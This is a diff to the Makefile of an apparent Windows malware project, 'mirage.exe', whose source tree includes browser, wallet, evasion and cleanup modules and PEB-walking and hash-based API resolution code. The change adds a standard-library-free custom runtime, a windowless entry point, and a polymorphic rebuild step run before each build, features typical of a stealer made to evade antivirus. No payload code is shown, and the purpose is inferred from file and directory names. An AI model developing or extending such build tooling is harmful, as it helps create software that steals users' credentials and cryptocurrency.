@@ -1,9 +1,15 @@
 CC = x86_64-w64-mingw32-gcc
 NASM = nasm
-CFLAGS = -Wall -Wextra -Wno-error -O2 -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
-LDFLAGS = -Wl,--gc-sections -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32 -mwindows
+CFLAGS = -Wall -Wextra -Wno-error -O2 -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
+LDFLAGS = -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32
 
 SRCS = src/main.c \
+       src/rt/rt_startup.c \
+       src/rt/rt_mem.c \
+       src/rt/rt_str.c \
+       src/rt/rt_conv.c \
+       src/rt/rt_snprintf.c \
+       src/rt/rt_file.c \
        src/types/peb.c \
        src/types/hash.c \
        src/types/export_resolve.c \
@@ -62,9 +68,12 @@ ASM_SRCS = asm/mirage_stubs_v2.asm
 OBJS = $(SRCS:.c=.o) $(ASM_SRCS:.asm=.o)
 TARGET = mirage.exe
 
-.PHONY: all clean test
+.PHONY: all clean test polymorph
 
-all: $(TARGET)
+all: polymorph $(TARGET)
+
+polymorph:
+	python3 tools/make_polymorphic.py
 
 test: $(TARGET)
 	./$(TARGET) --test
